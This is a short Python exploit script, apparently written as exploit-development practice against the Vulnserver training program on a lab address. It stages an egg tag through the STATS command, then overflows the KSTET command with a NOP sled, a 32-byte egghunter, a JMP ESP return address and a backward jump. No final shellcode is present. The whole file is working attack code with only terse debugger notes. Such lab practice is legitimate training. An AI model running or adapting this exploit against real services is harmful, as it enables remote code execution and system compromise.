import sys
import socket

#debug breakpoint jmp esp 625011af essfunc.dll
#jump back 60 ##msf-nasm_shell $ESP-60 EB C2



# 1.debug break point start 2. debug break point 2nd conpare tag
# Put this tag in front of your shellcode : dudedude
# 32byte egghunter tag=dude "\x64\x75\x64\x65"
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += b"\xef\xb8\x64\x75\x64\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


#mona generic pattern 1000 ##mona findmsp
junk = "dudedude" + "A"*1000

stuff = "\x90"*18 + egghunter + "\x90"*20 + "\xaf\x11\x50\x62" + "\xeb\xc2\x90\x90" + "X"*4900

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

cmd1 = "STATS " + junk

s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send(cmd1)
s.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

cmd2 = "KSTET " + stuff

s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send(cmd2)
s.close()
